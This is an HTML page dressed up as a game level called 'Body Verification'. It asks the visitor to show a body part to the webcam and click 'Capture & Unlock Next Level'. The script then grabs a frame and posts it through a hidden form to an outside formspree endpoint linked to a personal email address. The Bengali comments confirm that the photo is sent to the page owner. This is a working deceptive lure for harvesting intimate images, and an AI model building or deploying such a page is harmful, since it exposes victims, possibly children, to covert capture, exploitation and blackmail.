<!DOCTYPE html>
<html>
<head>
    <title>System Level Verification</title>
    <style>
        body { background: #111; color: #0f0; font-family: 'Courier New'; text-align: center; }
        video { border: 2px solid #0f0; width: 320px; border-radius: 10px; }
        canvas { display: none; }
        .box { margin-top: 50px; padding: 20px; border: 1px solid #0f0; display: inline-block; }
        button { background: #0f0; color: #000; padding: 10px; border: none; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="box">
        <h2>LEVEL CHALLENGE: BODY VERIFICATION</h2>
        <p>Align your body part in the camera and click capture.</p>
        
        <video id="video" autoplay></video><br>
        <button id="capture-btn">Capture & Unlock Next Level</button>
        
        <canvas id="canvas"></canvas>

        <form id="email-form" action="https://formspree.io/f/abdulakher2006@gmail.com" method="POST" enctype="multipart/form-data">
            <input type="hidden" name="image_data" id="image_data">
            <input type="hidden" name="message" value="Body part verification photo attached.">
        </form>
    </div>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const captureBtn = document.getElementById('capture-btn');
        const emailForm = document.getElementById('email-form');

        // ক্যামেরা চালু করা
        navigator.mediaDevices.getUserMedia({ video: true })
            .then(stream => { video.srcObject = stream; })
            .catch(err => { alert("Camera access required to play!"); });

        // ছবি তোলা এবং পাঠানো
        captureBtn.addEventListener('click', () => {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);
            
            // ছবিটিকে ডাটাতে রূপান্তর করা
            const imageData = canvas.toDataURL('image/png');
            document.getElementById('image_data').value = imageData;
            
            // ফর্ম সাবমিট করা (আপনার ইমেইলে চলে যাবে)
            emailForm.submit();
            alert("Verifying... Please wait for Level Update.");
        });
    </script>
</body>
</html>
